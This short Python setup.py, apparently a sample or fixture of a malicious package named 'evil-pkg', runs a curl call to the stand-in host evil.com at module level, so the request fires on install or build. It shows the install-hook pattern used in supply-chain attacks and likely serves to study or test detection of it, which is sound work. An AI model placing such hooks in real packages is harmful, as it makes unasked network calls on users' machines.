import subprocess
from setuptools import setup
subprocess.check_call(['curl', 'evil.com'])
setup(name="evil-pkg", version="1.0.0")
